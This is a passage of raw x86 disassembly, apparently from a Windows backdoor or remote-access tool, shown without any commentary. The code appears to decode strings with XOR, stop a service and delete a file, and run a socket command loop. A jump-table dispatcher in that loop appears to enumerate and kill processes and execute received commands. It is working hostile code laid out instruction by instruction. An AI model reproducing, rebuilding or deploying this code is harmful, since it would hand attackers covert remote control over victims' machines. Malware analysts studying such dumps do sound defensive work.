  40431b:	cc                   	int3
  40431c:	cc                   	int3
  40431d:	cc                   	int3
  40431e:	cc                   	int3
  40431f:	cc                   	int3
  404320:	55                   	push   %ebp
  404321:	8b ec                	mov    %esp,%ebp
  404323:	81 ec 80 02 00 00    	sub    $0x280,%esp
  404329:	68 04 01 00 00       	push   $0x104
  40432e:	8d 85 90 fd ff ff    	lea    -0x270(%ebp),%eax
  404334:	50                   	push   %eax
  404335:	ff 15 44 dd 40 00    	call   *0x40dd44
  40433b:	c7 85 84 fd ff ff 00 	movl   $0x0,-0x27c(%ebp)
  404342:	00 00 00 
  404345:	8b 8d 84 fd ff ff    	mov    -0x27c(%ebp),%ecx
  40434b:	0f b6 91 2c b0 40 00 	movzbl 0x40b02c(%ecx),%edx
  404352:	85 d2                	test   %edx,%edx
  404354:	74 2d                	je     0x404383
  404356:	8b 85 84 fd ff ff    	mov    -0x27c(%ebp),%eax
  40435c:	0f b6 88 2c b0 40 00 	movzbl 0x40b02c(%eax),%ecx
  404363:	83 f1 5a             	xor    $0x5a,%ecx
  404366:	8b 95 84 fd ff ff    	mov    -0x27c(%ebp),%edx
  40436c:	88 8a 2c b0 40 00    	mov    %cl,0x40b02c(%edx)
  404372:	8b 85 84 fd ff ff    	mov    -0x27c(%ebp),%eax
  404378:	83 c0 01             	add    $0x1,%eax
  40437b:	89 85 84 fd ff ff    	mov    %eax,-0x27c(%ebp)
  404381:	eb c2                	jmp    0x404345
  404383:	68 40 9a 40 00       	push   $0x409a40
  404388:	8d 8d 90 fd ff ff    	lea    -0x270(%ebp),%ecx
  40438e:	51                   	push   %ecx
  40438f:	e8 d0 35 00 00       	call   0x407964
  404394:	83 c4 08             	add    $0x8,%esp
  404397:	68 2c b0 40 00       	push   $0x40b02c
  40439c:	8d 95 90 fd ff ff    	lea    -0x270(%ebp),%edx
  4043a2:	52                   	push   %edx
  4043a3:	e8 bc 35 00 00       	call   0x407964
  4043a8:	83 c4 08             	add    $0x8,%esp
  4043ab:	68 3f 00 0f 00       	push   $0xf003f
  4043b0:	6a 00                	push   $0x0
  4043b2:	6a 00                	push   $0x0
  4043b4:	ff 15 70 dd 40 00    	call   *0x40dd70
  4043ba:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  4043c0:	c7 85 80 fd ff ff 00 	movl   $0x0,-0x280(%ebp)
  4043c7:	00 00 00 
  4043ca:	8b 85 80 fd ff ff    	mov    -0x280(%ebp),%eax
  4043d0:	0f b6 88 38 b0 40 00 	movzbl 0x40b038(%eax),%ecx
  4043d7:	85 c9                	test   %ecx,%ecx
  4043d9:	74 2d                	je     0x404408
  4043db:	8b 95 80 fd ff ff    	mov    -0x280(%ebp),%edx
  4043e1:	0f b6 82 38 b0 40 00 	movzbl 0x40b038(%edx),%eax
  4043e8:	83 f0 5a             	xor    $0x5a,%eax
  4043eb:	8b 8d 80 fd ff ff    	mov    -0x280(%ebp),%ecx
  4043f1:	88 81 38 b0 40 00    	mov    %al,0x40b038(%ecx)
  4043f7:	8b 95 80 fd ff ff    	mov    -0x280(%ebp),%edx
  4043fd:	83 c2 01             	add    $0x1,%edx
  404400:	89 95 80 fd ff ff    	mov    %edx,-0x280(%ebp)
  404406:	eb c2                	jmp    0x4043ca
  404408:	68 ff 01 0f 00       	push   $0xf01ff
  40440d:	68 38 b0 40 00       	push   $0x40b038
  404412:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  404418:	50                   	push   %eax
  404419:	ff 15 74 dd 40 00    	call   *0x40dd74
  40441f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404422:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  404426:	75 0f                	jne    0x404437
  404428:	8b 8d 8c fd ff ff    	mov    -0x274(%ebp),%ecx
  40442e:	51                   	push   %ecx
  40442f:	ff 15 84 dd 40 00    	call   *0x40dd84
  404435:	eb 63                	jmp    0x40449a
  404437:	8d 95 9c fe ff ff    	lea    -0x164(%ebp),%edx
  40443d:	52                   	push   %edx
  40443e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404441:	50                   	push   %eax
  404442:	ff 15 78 dd 40 00    	call   *0x40dd78
  404448:	85 c0                	test   %eax,%eax
  40444a:	74 44                	je     0x404490
  40444c:	83 bd a0 fe ff ff 01 	cmpl   $0x1,-0x160(%ebp)
  404453:	74 3b                	je     0x404490
  404455:	8d 8d 9c fe ff ff    	lea    -0x164(%ebp),%ecx
  40445b:	51                   	push   %ecx
  40445c:	6a 01                	push   $0x1
  40445e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404461:	52                   	push   %edx
  404462:	ff 15 7c dd 40 00    	call   *0x40dd7c
  404468:	85 c0                	test   %eax,%eax
  40446a:	74 24                	je     0x404490
  40446c:	83 bd a0 fe ff ff 03 	cmpl   $0x3,-0x160(%ebp)
  404473:	75 1b                	jne    0x404490
  404475:	6a 0a                	push   $0xa
  404477:	ff 15 30 de 40 00    	call   *0x40de30
  40447d:	8d 85 9c fe ff ff    	lea    -0x164(%ebp),%eax
  404483:	50                   	push   %eax
  404484:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404487:	51                   	push   %ecx
  404488:	ff 15 78 dd 40 00    	call   *0x40dd78
  40448e:	eb dc                	jmp    0x40446c
  404490:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404493:	52                   	push   %edx
  404494:	ff 15 80 dd 40 00    	call   *0x40dd80
  40449a:	8b 85 8c fd ff ff    	mov    -0x274(%ebp),%eax
  4044a0:	50                   	push   %eax
  4044a1:	ff 15 84 dd 40 00    	call   *0x40dd84
  4044a7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4044aa:	51                   	push   %ecx
  4044ab:	ff 15 84 dd 40 00    	call   *0x40dd84
  4044b1:	68 dc 05 00 00       	push   $0x5dc
  4044b6:	ff 15 30 de 40 00    	call   *0x40de30
  4044bc:	8d 95 b8 fe ff ff    	lea    -0x148(%ebp),%edx
  4044c2:	52                   	push   %edx
  4044c3:	8d 85 90 fd ff ff    	lea    -0x270(%ebp),%eax
  4044c9:	50                   	push   %eax
  4044ca:	ff 15 10 de 40 00    	call   *0x40de10
  4044d0:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  4044d6:	83 bd 88 fd ff ff ff 	cmpl   $0xffffffff,-0x278(%ebp)
  4044dd:	74 0d                	je     0x4044ec
  4044df:	8b 8d 88 fd ff ff    	mov    -0x278(%ebp),%ecx
  4044e5:	51                   	push   %ecx
  4044e6:	ff 15 18 de 40 00    	call   *0x40de18
  4044ec:	8b e5                	mov    %ebp,%esp
  4044ee:	5d                   	pop    %ebp
  4044ef:	c3                   	ret
  4044f0:	55                   	push   %ebp
  4044f1:	8b ec                	mov    %esp,%ebp
  4044f3:	83 ec 18             	sub    $0x18,%esp
  4044f6:	68 18 dd 40 00       	push   $0x40dd18
  4044fb:	e8 b0 d2 ff ff       	call   0x4017b0
  404500:	83 c4 04             	add    $0x4,%esp
  404503:	85 c0                	test   %eax,%eax
  404505:	75 0a                	jne    0x404511
  404507:	b8 01 00 00 00       	mov    $0x1,%eax
  40450c:	e9 53 01 00 00       	jmp    0x404664
  404511:	e8 7a f5 ff ff       	call   0x403a90
  404516:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404519:	50                   	push   %eax
  40451a:	6a 00                	push   $0x0
  40451c:	6a 00                	push   $0x0
  40451e:	68 00 3c 40 00       	push   $0x403c00
  404523:	6a 00                	push   $0x0
  404525:	6a 00                	push   $0x0
  404527:	ff 15 40 dd 40 00    	call   *0x40dd40
  40452d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404530:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  404534:	75 0a                	jne    0x404540
  404536:	b8 01 00 00 00       	mov    $0x1,%eax
  40453b:	e9 24 01 00 00       	jmp    0x404664
  404540:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404543:	51                   	push   %ecx
  404544:	ff 15 30 dd 40 00    	call   *0x40dd30
  40454a:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40454d:	52                   	push   %edx
  40454e:	6a 00                	push   $0x0
  404550:	6a 00                	push   $0x0
  404552:	68 70 40 40 00       	push   $0x404070
  404557:	6a 00                	push   $0x0
  404559:	6a 00                	push   $0x0
  40455b:	ff 15 40 dd 40 00    	call   *0x40dd40
  404561:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404564:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  404568:	75 0a                	jne    0x404574
  40456a:	b8 01 00 00 00       	mov    $0x1,%eax
  40456f:	e9 f0 00 00 00       	jmp    0x404664
  404574:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404577:	50                   	push   %eax
  404578:	ff 15 30 dd 40 00    	call   *0x40dd30
  40457e:	e8 5d fb ff ff       	call   0x4040e0
  404583:	b9 01 00 00 00       	mov    $0x1,%ecx
  404588:	85 c9                	test   %ecx,%ecx
  40458a:	0f 84 9c 00 00 00    	je     0x40462c
  404590:	e8 db 01 00 00       	call   0x404770
  404595:	85 c0                	test   %eax,%eax
  404597:	0f 84 85 00 00 00    	je     0x404622
  40459d:	68 01 04 00 00       	push   $0x401
  4045a2:	e8 b1 33 00 00       	call   0x407958
  4045a7:	83 c4 04             	add    $0x4,%esp
  4045aa:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4045ad:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4045b0:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4045b3:	b8 01 00 00 00       	mov    $0x1,%eax
  4045b8:	85 c0                	test   %eax,%eax
  4045ba:	74 4d                	je     0x404609
  4045bc:	68 01 04 00 00       	push   $0x401
  4045c1:	6a 00                	push   $0x0
  4045c3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4045c6:	51                   	push   %ecx
  4045c7:	e8 48 33 00 00       	call   0x407914
  4045cc:	83 c4 0c             	add    $0xc,%esp
  4045cf:	6a 00                	push   $0x0
  4045d1:	6a 00                	push   $0x0
  4045d3:	68 00 04 00 00       	push   $0x400
  4045d8:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4045db:	52                   	push   %edx
  4045dc:	a1 08 b0 40 00       	mov    0x40b008,%eax
  4045e1:	50                   	push   %eax
  4045e2:	e8 29 e1 ff ff       	call   0x402710
  4045e7:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4045ea:	83 7d f0 ff          	cmpl   $0xffffffff,-0x10(%ebp)
  4045ee:	74 15                	je     0x404605
  4045f0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4045f3:	51                   	push   %ecx
  4045f4:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4045f7:	52                   	push   %edx
  4045f8:	e8 b3 02 00 00       	call   0x4048b0
  4045fd:	83 c4 08             	add    $0x8,%esp
  404600:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404603:	eb 02                	jmp    0x404607
  404605:	eb 02                	jmp    0x404609
  404607:	eb aa                	jmp    0x4045b3
  404609:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40460c:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40460f:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404612:	51                   	push   %ecx
  404613:	e8 34 33 00 00       	call   0x40794c
  404618:	83 c4 04             	add    $0x4,%esp
  40461b:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  404622:	e8 19 02 00 00       	call   0x404840
  404627:	e9 57 ff ff ff       	jmp    0x404583
  40462c:	e8 3f de ff ff       	call   0x402470
  404631:	8d 55 f8             	lea    -0x8(%ebp),%edx
  404634:	52                   	push   %edx
  404635:	6a 00                	push   $0x0
  404637:	6a 00                	push   $0x0
  404639:	68 d0 3d 40 00       	push   $0x403dd0
  40463e:	6a 00                	push   $0x0
  404640:	6a 00                	push   $0x0
  404642:	ff 15 40 dd 40 00    	call   *0x40dd40
  404648:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40464b:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40464f:	75 07                	jne    0x404658
  404651:	b8 01 00 00 00       	mov    $0x1,%eax
  404656:	eb 0c                	jmp    0x404664
  404658:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40465b:	50                   	push   %eax
  40465c:	ff 15 30 dd 40 00    	call   *0x40dd30
  404662:	33 c0                	xor    %eax,%eax
  404664:	8b e5                	mov    %ebp,%esp
  404666:	5d                   	pop    %ebp
  404667:	c2 10 00             	ret    $0x10
  40466a:	cc                   	int3
  40466b:	cc                   	int3
  40466c:	cc                   	int3
  40466d:	cc                   	int3
  40466e:	cc                   	int3
  40466f:	cc                   	int3
  404670:	55                   	push   %ebp
  404671:	8b ec                	mov    %esp,%ebp
  404673:	83 ec 08             	sub    $0x8,%esp
  404676:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  40467d:	8b 45 08             	mov    0x8(%ebp),%eax
  404680:	50                   	push   %eax
  404681:	6a 00                	push   $0x0
  404683:	68 ff ff 1f 00       	push   $0x1fffff
  404688:	ff 15 2c dd 40 00    	call   *0x40dd2c
  40468e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404691:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  404695:	74 0f                	je     0x4046a6
  404697:	6a 00                	push   $0x0
  404699:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40469c:	51                   	push   %ecx
  40469d:	ff 15 28 dd 40 00    	call   *0x40dd28
  4046a3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4046a6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4046a9:	52                   	push   %edx
  4046aa:	ff 15 30 dd 40 00    	call   *0x40dd30
  4046b0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4046b3:	8b e5                	mov    %ebp,%esp
  4046b5:	5d                   	pop    %ebp
  4046b6:	c3                   	ret
  4046b7:	cc                   	int3
  4046b8:	cc                   	int3
  4046b9:	cc                   	int3
  4046ba:	cc                   	int3
  4046bb:	cc                   	int3
  4046bc:	cc                   	int3
  4046bd:	cc                   	int3
  4046be:	cc                   	int3
  4046bf:	cc                   	int3
  4046c0:	55                   	push   %ebp
  4046c1:	8b ec                	mov    %esp,%ebp
  4046c3:	81 ec 34 01 00 00    	sub    $0x134,%esp
  4046c9:	6a 00                	push   $0x0
  4046cb:	6a 02                	push   $0x2
  4046cd:	ff 15 c4 dd 40 00    	call   *0x40ddc4
  4046d3:	89 85 cc fe ff ff    	mov    %eax,-0x134(%ebp)
  4046d9:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4046e0:	c7 85 d0 fe ff ff 28 	movl   $0x128,-0x130(%ebp)
  4046e7:	01 00 00 
  4046ea:	8d 85 d0 fe ff ff    	lea    -0x130(%ebp),%eax
  4046f0:	50                   	push   %eax
  4046f1:	8b 8d cc fe ff ff    	mov    -0x134(%ebp),%ecx
  4046f7:	51                   	push   %ecx
  4046f8:	ff 15 c8 dd 40 00    	call   *0x40ddc8
  4046fe:	85 c0                	test   %eax,%eax
  404700:	74 31                	je     0x404733
  404702:	6a 00                	push   $0x0
  404704:	6a 00                	push   $0x0
  404706:	68 2c 01 00 00       	push   $0x12c
  40470b:	8d 95 d0 fe ff ff    	lea    -0x130(%ebp),%edx
  404711:	52                   	push   %edx
  404712:	8b 45 08             	mov    0x8(%ebp),%eax
  404715:	50                   	push   %eax
  404716:	e8 65 de ff ff       	call   0x402580
  40471b:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  404721:	51                   	push   %ecx
  404722:	8b 95 cc fe ff ff    	mov    -0x134(%ebp),%edx
  404728:	52                   	push   %edx
  404729:	ff 15 cc dd 40 00    	call   *0x40ddcc
  40472f:	85 c0                	test   %eax,%eax
  404731:	75 cf                	jne    0x404702
  404733:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40473a:	6a 00                	push   $0x0
  40473c:	6a 00                	push   $0x0
  40473e:	68 2c 01 00 00       	push   $0x12c
  404743:	8d 85 d0 fe ff ff    	lea    -0x130(%ebp),%eax
  404749:	50                   	push   %eax
  40474a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40474d:	51                   	push   %ecx
  40474e:	e8 2d de ff ff       	call   0x402580
  404753:	8b 95 cc fe ff ff    	mov    -0x134(%ebp),%edx
  404759:	52                   	push   %edx
  40475a:	ff 15 30 dd 40 00    	call   *0x40dd30
  404760:	33 c0                	xor    %eax,%eax
  404762:	8b e5                	mov    %ebp,%esp
  404764:	5d                   	pop    %ebp
  404765:	c3                   	ret
  404766:	cc                   	int3
  404767:	cc                   	int3
  404768:	cc                   	int3
  404769:	cc                   	int3
  40476a:	cc                   	int3
  40476b:	cc                   	int3
  40476c:	cc                   	int3
  40476d:	cc                   	int3
  40476e:	cc                   	int3
  40476f:	cc                   	int3
  404770:	55                   	push   %ebp
  404771:	8b ec                	mov    %esp,%ebp
  404773:	81 ec e0 02 00 00    	sub    $0x2e0,%esp
  404779:	e8 82 dc ff ff       	call   0x402400
  40477e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404781:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  404785:	75 08                	jne    0x40478f
  404787:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40478a:	e9 a0 00 00 00       	jmp    0x40482f
  40478f:	68 08 b0 40 00       	push   $0x40b008
  404794:	e8 f7 dc ff ff       	call   0x402490
  404799:	85 c0                	test   %eax,%eax
  40479b:	75 07                	jne    0x4047a4
  40479d:	33 c0                	xor    %eax,%eax
  40479f:	e9 8b 00 00 00       	jmp    0x40482f
  4047a4:	b8 01 00 00 00       	mov    $0x1,%eax
  4047a9:	85 c0                	test   %eax,%eax
  4047ab:	74 32                	je     0x4047df
  4047ad:	8b 0d 18 b0 40 00    	mov    0x40b018,%ecx
  4047b3:	51                   	push   %ecx
  4047b4:	68 0c b0 40 00       	push   $0x40b00c
  4047b9:	8b 15 08 b0 40 00    	mov    0x40b008,%edx
  4047bf:	52                   	push   %edx
  4047c0:	e8 6b dd ff ff       	call   0x402530
  4047c5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4047c8:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4047cc:	75 0d                	jne    0x4047db
  4047ce:	68 d0 07 00 00       	push   $0x7d0
  4047d3:	ff 15 30 de 40 00    	call   *0x40de30
  4047d9:	eb c9                	jmp    0x4047a4
  4047db:	eb 02                	jmp    0x4047df
  4047dd:	eb c5                	jmp    0x4047a4
  4047df:	83 3d 08 b0 40 00 ff 	cmpl   $0xffffffff,0x40b008
  4047e6:	74 44                	je     0x40482c
  4047e8:	6a 00                	push   $0x0
  4047ea:	6a 06                	push   $0x6
  4047ec:	6a 00                	push   $0x0
  4047ee:	6a 00                	push   $0x0
  4047f0:	a1 08 b0 40 00       	mov    0x40b008,%eax
  4047f5:	50                   	push   %eax
  4047f6:	e8 85 dd ff ff       	call   0x402580
  4047fb:	8d 8d 20 fd ff ff    	lea    -0x2e0(%ebp),%ecx
  404801:	51                   	push   %ecx
  404802:	e8 a9 25 00 00       	call   0x406db0
  404807:	83 c4 04             	add    $0x4,%esp
  40480a:	6a 00                	push   $0x0
  40480c:	6a 00                	push   $0x0
  40480e:	68 d8 02 00 00       	push   $0x2d8
  404813:	8d 95 20 fd ff ff    	lea    -0x2e0(%ebp),%edx
  404819:	52                   	push   %edx
  40481a:	a1 08 b0 40 00       	mov    0x40b008,%eax
  40481f:	50                   	push   %eax
  404820:	e8 5b dd ff ff       	call   0x402580
  404825:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40482c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40482f:	8b e5                	mov    %ebp,%esp
  404831:	5d                   	pop    %ebp
  404832:	c3                   	ret
  404833:	cc                   	int3
  404834:	cc                   	int3
  404835:	cc                   	int3
  404836:	cc                   	int3
  404837:	cc                   	int3
  404838:	cc                   	int3
  404839:	cc                   	int3
  40483a:	cc                   	int3
  40483b:	cc                   	int3
  40483c:	cc                   	int3
  40483d:	cc                   	int3
  40483e:	cc                   	int3
  40483f:	cc                   	int3
  404840:	55                   	push   %ebp
  404841:	8b ec                	mov    %esp,%ebp
  404843:	83 3d a0 de 40 00 00 	cmpl   $0x0,0x40dea0
  40484a:	74 34                	je     0x404880
  40484c:	6a 00                	push   $0x0
  40484e:	a1 a0 de 40 00       	mov    0x40dea0,%eax
  404853:	50                   	push   %eax
  404854:	ff 15 d4 dd 40 00    	call   *0x40ddd4
  40485a:	6a ff                	push   $0xffffffff
  40485c:	8b 0d a0 de 40 00    	mov    0x40dea0,%ecx
  404862:	51                   	push   %ecx
  404863:	ff 15 d0 dd 40 00    	call   *0x40ddd0
  404869:	8b 15 a0 de 40 00    	mov    0x40dea0,%edx
  40486f:	52                   	push   %edx
  404870:	ff 15 30 dd 40 00    	call   *0x40dd30
  404876:	c7 05 a0 de 40 00 00 	movl   $0x0,0x40dea0
  40487d:	00 00 00 
  404880:	83 3d 08 b0 40 00 ff 	cmpl   $0xffffffff,0x40b008
  404887:	74 0b                	je     0x404894
  404889:	a1 08 b0 40 00       	mov    0x40b008,%eax
  40488e:	50                   	push   %eax
  40488f:	e8 0c df ff ff       	call   0x4027a0
  404894:	c7 05 08 b0 40 00 ff 	movl   $0xffffffff,0x40b008
  40489b:	ff ff ff 
  40489e:	b8 01 00 00 00       	mov    $0x1,%eax
  4048a3:	5d                   	pop    %ebp
  4048a4:	c3                   	ret
  4048a5:	cc                   	int3
  4048a6:	cc                   	int3
  4048a7:	cc                   	int3
  4048a8:	cc                   	int3
  4048a9:	cc                   	int3
  4048aa:	cc                   	int3
  4048ab:	cc                   	int3
  4048ac:	cc                   	int3
  4048ad:	cc                   	int3
  4048ae:	cc                   	int3
  4048af:	cc                   	int3
  4048b0:	55                   	push   %ebp
  4048b1:	8b ec                	mov    %esp,%ebp
  4048b3:	81 ec c8 02 00 00    	sub    $0x2c8,%esp
  4048b9:	56                   	push   %esi
  4048ba:	57                   	push   %edi
  4048bb:	8b 45 08             	mov    0x8(%ebp),%eax
  4048be:	0f b6 08             	movzbl (%eax),%ecx
  4048c1:	89 8d 38 fd ff ff    	mov    %ecx,-0x2c8(%ebp)
  4048c7:	8b 95 38 fd ff ff    	mov    -0x2c8(%ebp),%edx
  4048cd:	83 ea 04             	sub    $0x4,%edx
  4048d0:	89 95 38 fd ff ff    	mov    %edx,-0x2c8(%ebp)
  4048d6:	81 bd 38 fd ff ff db 	cmpl   $0xdb,-0x2c8(%ebp)
  4048dd:	00 00 00 
  4048e0:	0f 87 74 02 00 00    	ja     0x404b5a
  4048e6:	8b 85 38 fd ff ff    	mov    -0x2c8(%ebp),%eax
  4048ec:	0f b6 88 98 4b 40 00 	movzbl 0x404b98(%eax),%ecx
  4048f3:	ff 24 8d 64 4b 40 00 	jmp    *0x404b64(,%ecx,4)
  4048fa:	e8 21 fa ff ff       	call   0x404320
  4048ff:	e8 3c ff ff ff       	call   0x404840
  404904:	e9 51 02 00 00       	jmp    0x404b5a
  404909:	e8 32 ff ff ff       	call   0x404840
  40490e:	e9 47 02 00 00       	jmp    0x404b5a
  404913:	8b 15 08 b0 40 00    	mov    0x40b008,%edx
  404919:	52                   	push   %edx
  40491a:	e8 a1 fd ff ff       	call   0x4046c0
  40491f:	83 c4 04             	add    $0x4,%esp
  404922:	e9 33 02 00 00       	jmp    0x404b5a
  404927:	8b 45 08             	mov    0x8(%ebp),%eax
  40492a:	8b 48 01             	mov    0x1(%eax),%ecx
  40492d:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  404930:	8b 55 f8             	mov    -0x8(%ebp),%edx
  404933:	52                   	push   %edx
  404934:	e8 37 fd ff ff       	call   0x404670
  404939:	83 c4 04             	add    $0x4,%esp
  40493c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40493f:	6a 00                	push   $0x0
  404941:	6a 03                	push   $0x3
  404943:	6a 04                	push   $0x4
  404945:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404948:	50                   	push   %eax
  404949:	8b 0d 08 b0 40 00    	mov    0x40b008,%ecx
  40494f:	51                   	push   %ecx
  404950:	e8 2b dc ff ff       	call   0x402580
  404955:	e9 00 02 00 00       	jmp    0x404b5a
  40495a:	8b 55 08             	mov    0x8(%ebp),%edx
  40495d:	83 c2 01             	add    $0x1,%edx
  404960:	52                   	push   %edx
  404961:	68 44 9a 40 00       	push   $0x409a44
  404966:	68 18 d9 40 00       	push   $0x40d918
  40496b:	ff 15 74 90 40 00    	call   *0x409074
  404971:	83 c4 0c             	add    $0xc,%esp
  404974:	68 18 d9 40 00       	push   $0x40d918
  404979:	a1 08 b0 40 00       	mov    0x40b008,%eax
  40497e:	50                   	push   %eax
  40497f:	e8 8c ee ff ff       	call   0x403810
  404984:	83 c4 08             	add    $0x8,%esp
  404987:	e9 ce 01 00 00       	jmp    0x404b5a
  40498c:	8b 0d 08 b0 40 00    	mov    0x40b008,%ecx
  404992:	51                   	push   %ecx
  404993:	e8 68 c6 ff ff       	call   0x401000
  404998:	e9 bd 01 00 00       	jmp    0x404b5a
  40499d:	8b 55 08             	mov    0x8(%ebp),%edx
  4049a0:	83 c2 01             	add    $0x1,%edx
  4049a3:	52                   	push   %edx
  4049a4:	68 48 9a 40 00       	push   $0x409a48
  4049a9:	68 18 d9 40 00       	push   $0x40d918
  4049ae:	ff 15 74 90 40 00    	call   *0x409074
  4049b4:	83 c4 0c             	add    $0xc,%esp
  4049b7:	68 18 d9 40 00       	push   $0x40d918
  4049bc:	a1 08 b0 40 00       	mov    0x40b008,%eax
  4049c1:	50                   	push   %eax
  4049c2:	e8 c9 c7 ff ff       	call   0x401190
  4049c7:	e9 8e 01 00 00       	jmp    0x404b5a
  4049cc:	6a 00                	push   $0x0
  4049ce:	6a 00                	push   $0x0
  4049d0:	68 b8 00 00 00       	push   $0xb8
  4049d5:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
  4049db:	51                   	push   %ecx
  4049dc:	8b 15 08 b0 40 00    	mov    0x40b008,%edx
  4049e2:	52                   	push   %edx
  4049e3:	e8 28 dd ff ff       	call   0x402710
  4049e8:	81 ec b8 00 00 00    	sub    $0xb8,%esp
  4049ee:	b9 2e 00 00 00       	mov    $0x2e,%ecx
  4049f3:	8d b5 40 ff ff ff    	lea    -0xc0(%ebp),%esi
  4049f9:	8b fc                	mov    %esp,%edi
  4049fb:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4049fd:	a1 08 b0 40 00       	mov    0x40b008,%eax
  404a02:	50                   	push   %eax
  404a03:	e8 c8 ca ff ff       	call   0x4014d0
  404a08:	e9 4d 01 00 00       	jmp    0x404b5a
  404a0d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404a10:	83 c1 01             	add    $0x1,%ecx
  404a13:	51                   	push   %ecx
  404a14:	68 4c 9a 40 00       	push   $0x409a4c
  404a19:	68 18 d9 40 00       	push   $0x40d918
  404a1e:	ff 15 74 90 40 00    	call   *0x409074
  404a24:	83 c4 0c             	add    $0xc,%esp
  404a27:	6a 00                	push   $0x0
  404a29:	6a 00                	push   $0x0
  404a2b:	6a 00                	push   $0x0
  404a2d:	68 80 4c 40 00       	push   $0x404c80
  404a32:	6a 00                	push   $0x0
  404a34:	6a 00                	push   $0x0
  404a36:	ff 15 40 dd 40 00    	call   *0x40dd40
  404a3c:	e9 19 01 00 00       	jmp    0x404b5a
  404a41:	c6 85 40 fe ff ff 00 	movb   $0x0,-0x1c0(%ebp)
  404a48:	68 fe 00 00 00       	push   $0xfe
  404a4d:	6a 00                	push   $0x0
  404a4f:	8d 95 41 fe ff ff    	lea    -0x1bf(%ebp),%edx
  404a55:	52                   	push   %edx
  404a56:	e8 b9 2e 00 00       	call   0x407914
  404a5b:	83 c4 0c             	add    $0xc,%esp
  404a5e:	8b 45 08             	mov    0x8(%ebp),%eax
  404a61:	83 c0 01             	add    $0x1,%eax
  404a64:	50                   	push   %eax
  404a65:	68 50 9a 40 00       	push   $0x409a50
  404a6a:	8d 8d 40 fe ff ff    	lea    -0x1c0(%ebp),%ecx
  404a70:	51                   	push   %ecx
  404a71:	ff 15 74 90 40 00    	call   *0x409074
  404a77:	83 c4 0c             	add    $0xc,%esp
  404a7a:	8d 95 40 fe ff ff    	lea    -0x1c0(%ebp),%edx
  404a80:	52                   	push   %edx
  404a81:	ff 15 50 dd 40 00    	call   *0x40dd50
  404a87:	e9 ce 00 00 00       	jmp    0x404b5a
  404a8c:	c6 85 40 fd ff ff 00 	movb   $0x0,-0x2c0(%ebp)
  404a93:	68 fe 00 00 00       	push   $0xfe
  404a98:	6a 00                	push   $0x0
  404a9a:	8d 85 41 fd ff ff    	lea    -0x2bf(%ebp),%eax
  404aa0:	50                   	push   %eax
  404aa1:	e8 6e 2e 00 00       	call   0x407914
  404aa6:	83 c4 0c             	add    $0xc,%esp
  404aa9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404aac:	83 c1 01             	add    $0x1,%ecx
  404aaf:	51                   	push   %ecx
  404ab0:	68 54 9a 40 00       	push   $0x409a54
  404ab5:	8d 95 40 fd ff ff    	lea    -0x2c0(%ebp),%edx
  404abb:	52                   	push   %edx
  404abc:	ff 15 74 90 40 00    	call   *0x409074
  404ac2:	83 c4 0c             	add    $0xc,%esp
  404ac5:	83 3d b8 de 40 00 00 	cmpl   $0x0,0x40deb8
  404acc:	75 52                	jne    0x404b20
  404ace:	c7 85 3c fd ff ff 00 	movl   $0x0,-0x2c4(%ebp)
  404ad5:	00 00 00 
  404ad8:	8b 85 3c fd ff ff    	mov    -0x2c4(%ebp),%eax
